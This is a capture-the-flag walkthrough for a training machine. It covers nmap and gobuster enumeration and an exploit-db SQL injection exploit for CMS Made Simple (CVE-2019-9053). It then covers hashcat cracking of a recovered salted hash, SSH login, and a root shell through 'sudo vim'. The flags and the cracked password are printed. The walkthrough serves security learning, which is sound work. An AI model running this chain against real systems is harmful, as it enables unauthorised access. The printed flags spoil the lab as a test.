# EasyCTF


1. Enumerate with nmap. 2 services are runningn under port 1000, and ssh is running on the higher port at 2222
```
root@ip-10-10-221-120:~# sudo nmap -sC -A 10.10.164.10

Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-21 06:37 GMT
Nmap scan report for ip-10-10-164-10.eu-west-1.compute.internal (10.10.164.10)
Host is up (0.00042s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.221.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:AF:54:CB:F3:77 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.13 (92%), Linux 3.8 (92%), Crestron XPanel control system (89%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.16 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%), Linux 2.6.32 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms ip-10-10-164-10.eu-west-1.compute.internal (10.10.164.10)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.65 seconds
```

2. Run gobuster on the we server at port 80. The directory on `robots.txt` doesn't exist, so it's probably a distraction. `/simple` shows us that `CMS Made Simple` is installed
```
root@ip-10-10-221-120:~# gobuster dir -u http://10.10.164.10/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.164.10/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/21 06:40:21 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2022/02/21 06:40:21 Finished
===============================================================
```

3. Research on `CMS Made Simple` shows us that it had a SQL injection (SQLI) vulnerability `CVE-2019-9053`. `https://nvd.nist.gov/vuln/detail/CVE-2019-9053`, `http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-9053`. We also find an exploit script `https://www.exploit-db.com/exploits/46635`

4. Run the exploit with `python exploit.py -u http://10.10.164.10/simple/ --crack -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt`. It gives an error and doesn't crack the hash for us, so we have to crack it manually
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[*] Try: 000000
Traceback (most recent call last):
  File "exploit.py", line 184, in <module>
    crack_password()
  File "exploit.py", line 56, in crack_password
    if hashlib.md5(str(salt) + line).hexdigest() == password:
TypeError: Unicode-objects must be encoded before hashing
```

5. Save the salt and hash to a file in this format `0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2` and then run hashcat with `hashcat -a 0 -m 20 hash /usr/share/wordlists/SecLists/Passwords/Common-Credentials/best110.txt` to get `secret`

6. Log into ssh with `ssh -p 2222 mitch@<ip address>` and the password `secret`. `-p` is necessary because ssh is not running on the default port

7. Print out the user flag `G00d j0b, keep up!`, we see that `sunbath` is a user directory in `/home`

8. Use `sudo -l` to list sudo permissions, we see that we can run vim as admin, use `sudo vim -c ':!/bin/sh'` to get a root shell and print out `root.txt` to get `W3ll d0n3. You made it!`
